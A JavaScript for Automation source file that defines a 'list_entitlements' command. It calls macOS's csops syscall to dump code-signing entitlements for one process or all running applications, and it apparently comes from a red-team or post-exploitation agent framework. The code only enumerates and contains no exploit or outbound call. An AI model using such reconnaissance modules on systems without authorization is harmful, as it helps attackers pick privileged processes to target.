exports.list_entitlements = function(task, command, params){
    ObjC.import('AppKit');
    let le = function(pid){
        ObjC.bindFunction('malloc', ['void**', ['int']]);
        ObjC.bindFunction('csops', ['int', ['int', 'int', 'void *', 'int'] ]);
        let output = $.malloc(512000);
        $.csops(pid, 7, output, 512000);
        let data = $.NSData.alloc.initWithBytesLength(output, 512000);
        for(let i = 8; i < data.length; i ++){
            if(data.bytes[i] === 0){
                let range = $.NSMakeRange(8, i);
                data = data.subdataWithRange(range);
                let plist = $.NSPropertyListSerialization.propertyListWithDataOptionsFormatError(data, $.NSPropertyListImmutable, $.nil, $());
                return ObjC.deepUnwrap(plist);
            }
        }
        return {};
    }
    try{
        let arguments = JSON.parse(params);
        let output = [];
        if(arguments["pid"] === -1){
            let procs = $.NSWorkspace.sharedWorkspace.runningApplications.js;
            for(let i = 0; i < procs.length; i++){
                let entitlements = {};
                let ent = le(procs[i].processIdentifier);
                if(ent === null || ent === undefined){
                	ent = {};
                }
                entitlements["pid"] = procs[i].processIdentifier;
                entitlements['bundle'] = procs[i].bundleIdentifier.js;
            	entitlements['bundleURL'] = procs[i].bundleURL.path.js;
            	entitlements['bin_path'] = procs[i].executableURL.path.js;
            	entitlements['name'] = procs[i].localizedName.js;
            	entitlements["entitlements"] = ent;
                output.push(entitlements);
            }
        }else {
            let entitlements = {};
            let ent = le(arguments["pid"]);
            entitlements["pid"] = arguments["pid"];
            entitlements['bundle'] = "";
            entitlements['bundleURL'] = "";
            entitlements['bin_path'] = "";
            entitlements['name'] = "";
            entitlements["entitlements"] = ent;
            output.push(entitlements);
        }
        return {"user_output":JSON.stringify(output, null, 2), "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
